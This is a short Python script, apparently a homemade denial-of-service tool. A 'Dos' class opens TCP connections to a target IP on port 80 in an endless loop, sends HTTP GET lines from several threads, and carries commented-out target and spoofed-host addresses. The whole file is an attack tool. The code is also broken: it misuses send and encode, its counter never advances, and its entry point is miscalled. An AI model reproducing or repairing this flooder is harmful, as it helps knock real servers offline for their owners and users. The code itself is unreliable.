import time
import socket
from socket import *
import threading
import random

#ip = "190.155.18.199"
port = 80
#fake_ip = "182.21.20.32"

class Dos :

  def __init__(self, ip, porty, protocol, threading_count):
    self.ip = ip
    self.porty = porty
    self.protocol = protocol
    self.threading_count = threading_count

  def dos(self, ip, porty, protocol, threading_count):

    def attack():

      while True:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((ip, 80))
        s.send("GET /" + ip + "HTTP/1.1\r\n").encode(encoding='utf-8')
        #s.send(bytes)
        #s.send(("GET /" + ip + "HTTP/1.1\r\n").encode('ascii'), (ip, port))
        #s.send(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
        p = 0
        p = p + 1
        print(f"pocket {p}")
        time.sleep(2)
      s.close

    if threading_count == "none":
      attack()    
    
    else:
      for i in range(threading_count):
        thead = threading.Thread(target = attack)
        thead.start()

  if __name__ == "__main__":
    dos()